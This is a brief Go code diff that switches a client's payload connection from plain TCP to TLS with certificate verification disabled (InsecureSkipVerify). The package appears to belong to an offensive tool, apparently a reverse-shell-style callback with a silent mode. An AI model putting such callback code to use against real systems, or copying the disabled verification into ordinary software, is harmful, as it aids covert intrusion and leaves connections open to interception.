@@ -2,6 +2,7 @@ package client
 
 import (
 	"bufio"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"net"
@@ -26,8 +27,12 @@ type Client struct {
 
 // Run executes the payload
 func (c *Client) Run() {
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+
 	addr := c.Target + ":" + strconv.Itoa(c.Port)
-	conn, err := net.Dial("tcp", addr)
+	conn, err := tls.Dial("tcp", addr, conf)
 	if err != nil {
 		fmt.Println("[ERROR] dialing connection", err)
 		c.silentMode()
